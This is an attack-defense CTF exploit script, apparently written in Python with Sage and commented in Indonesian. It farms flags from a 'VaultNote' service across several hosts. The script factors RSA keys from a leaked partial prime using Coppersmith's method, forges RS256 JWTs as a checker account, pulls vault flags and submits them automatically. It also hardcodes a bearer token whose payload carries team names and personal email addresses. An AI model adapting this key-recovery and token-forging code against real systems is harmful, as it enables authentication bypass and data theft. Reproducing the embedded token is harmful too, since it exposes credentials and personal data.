#!/usr/bin/env sage -python
import argparse
import base64
import hashlib
import json
import re
import socket
import time
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from sage.all import PolynomialRing, Zmod, ZZ

urllib3.disable_warnings()

# ================= KONFIGURASI =================
TARGET_PORT = 8100
SUBMIT_URL = "https://10.0.2.3/api/v2/submit"   # sesuaikan dengan platform
SUBMIT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZWFtX2lkIjoxMDksInBsYXllcl9pZCI6MTYsInRlYW1fbmFtZSI6IkN1bWkgSGl0YW0gUGFrIEtyaXMiLCJ0ZWFtX2NvbnRhY3RfZW1haWwiOiJhcmlkd2FuaGFraW0xN0BnbWFpbC5jb20iLCJkaXNwbGF5X25hbWUiOiJrb25jb25lIGtpYWkiLCJlbWFpbCI6InJpZHdhbmR1bWJhY2NAZ21haWwuY29tIiwicm9sZSI6Im1lbWJlciIsImlhdCI6MTc4MjEwMjU5NywiZXhwIjoxNzgyMTg4OTk3fQ.dKhuHYQZ1crPnjCBlZxOiFupH5gkueEsrHBuU-7S530"

IP_RANGE = [f"10.80.5.{i}" for i in range(11, 21) if i != 19]

CHECKER_USER = "vn_checker"
SHA256_DER_PREFIX = bytes.fromhex("3031300d060960864801650304020105000420")

# ================= HELPER =================
def recv_line(sock):
    data = b""
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
    return data.decode("utf-8", errors="replace").strip()

def send_cmd(sock, cmd):
    sock.sendall((cmd + "\n").encode())
    return recv_line(sock)

def b64url(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

def recover_p_from_lsb(n, masked_p):
    suffix_hex = masked_p.replace("*", "")
    unknown_nibbles = masked_p.count("*")
    if not suffix_hex or unknown_nibbles <= 0:
        raise ValueError("Backup format tidak sesuai")
    known_suffix_bits = 4 * len(suffix_hex)
    unknown_bits = 4 * unknown_nibbles
    known_suffix = int(suffix_hex, 16)
    X = ZZ(1) << unknown_bits
    B = ZZ(1) << known_suffix_bits

    R = PolynomialRing(Zmod(n), "x")
    x = R.gen()
    f = (B * x + known_suffix).monic()

    params = [(0.49, 0.010), (0.48, 0.008), (0.47, 0.006), (0.45, 0.005)]
    for beta, epsilon in params:
        roots = f.small_roots(X=X, beta=beta, epsilon=epsilon)
        for root in roots:
            p = int(B) * int(ZZ(root)) + known_suffix
            if p > 1 and n % p == 0:
                return p
    raise RuntimeError("Gagal recover p.")

def rsa_pkcs1_v15_sha256_sign(signing_input, n, d):
    digest = hashlib.sha256(signing_input).digest()
    digest_info = SHA256_DER_PREFIX + digest
    k = (n.bit_length() + 7) // 8
    encoded_message = b"\x00\x01" + (b"\xff" * (k - len(digest_info) - 3)) + b"\x00" + digest_info
    m = int.from_bytes(encoded_message, "big")
    sig = pow(m, d, n)
    return sig.to_bytes(k, "big")

def make_rs256_jwt(sub, n, d, lifetime=3600):
    now = int(time.time())
    header = {"alg": "RS256", "typ": "JWT"}
    payload = {"sub": sub, "iat": now, "exp": now + lifetime}
    header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature_b64 = b64url(rsa_pkcs1_v15_sha256_sign(signing_input, n, d))
    return f"{header_b64}.{payload_b64}.{signature_b64}"

def parse_backup_response(resp):
    if not resp.startswith("OK backup "):
        raise ValueError(f"EXPORT_BACKUP gagal: {resp}")
    backup = json.loads(resp[len("OK backup "):])
    n = int(backup["n"], 16)
    e = int(backup["e"])
    masked_p = backup["p"]
    return n, e, masked_p

def extract_flag(vault_resp):
    if "secret_flag:" in vault_resp:
        return vault_resp.split("secret_flag:", 1)[1].split(" | ", 1)[0].strip()
    match = re.search(r"[A-Za-z0-9_\-]+\{[^}\r\n]+\}", vault_resp)
    return match.group(0) if match else None

def port_open(host, port, timeout=1):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

def submit_flag(flag):
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {SUBMIT_TOKEN}"
    }
    payload = {"flags": [flag]}
    try:
        r = requests.post(SUBMIT_URL, json=payload, headers=headers, timeout=10, verify=False)
        if r.status_code == 200:
            print(f"[*] Submit OK: {r.json()}")
        else:
            print(f"[-] Submit failed: {r.status_code} {r.text}")
    except Exception as e:
        print(f"[-] Submit exception: {e}")

def attack_target(host):
    print(f"[*] Checking {host}:{TARGET_PORT}...")
    if not port_open(host, TARGET_PORT, timeout=1):
        print(f"[-] {host}: Port {TARGET_PORT} closed/slow, skip")
        return None

    try:
        with socket.create_connection((host, TARGET_PORT), timeout=10.0) as sock:
            banner = recv_line(sock)
            print(f"[*] {host} banner: {banner}")

            resp = send_cmd(sock, "EXPORT_BACKUP")
            n, e, masked_p = parse_backup_response(resp)
            p = recover_p_from_lsb(n, masked_p)
            q = n // p
            phi = (p - 1) * (q - 1)
            d = pow(e, -1, phi)

            token = make_rs256_jwt(CHECKER_USER, n, d)
            vault_resp = send_cmd(sock, f"VAULT {token}")

            flag = extract_flag(vault_resp)
            if not flag:
                print(f"[-] {host}: Flag not found")
                return None

            print(f"[+] {host}: FLAG={flag}")
            send_cmd(sock, "QUIT")
            return flag
    except Exception as e:
        print(f"[-] {host}: Exception {e}")
        return None

def main():
    print("[*] Starting VaultNote farming...")
    flags = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(attack_target, host): host for host in IP_RANGE}
        for future in as_completed(futures):
            host = futures[future]
            try:
                flag = future.result(timeout=60)
                if flag:
                    flags.append(flag)
            except Exception as e:
                print(f"[-] {host}: Exception {e}")

    print("\n" + "="*50)
    print(f"Collected {len(flags)} flags:")
    for flag in flags:
        print(f"  {flag}")
    print("="*50)

    # Simpan ke file
    with open("vaultnote_flags.txt", "w") as f:
        for flag in flags:
            f.write(f"{flag}\n")
    print("[+] Flags saved to vaultnote_flags.txt")

    # Submit
    if flags:
        print(f"\n[*] Submitting {len(flags)} flags...")
        for flag in flags:
            submit_flag(flag)
    else:
        print("[-] No flags to submit.")

if __name__ == "__main__":
    main()
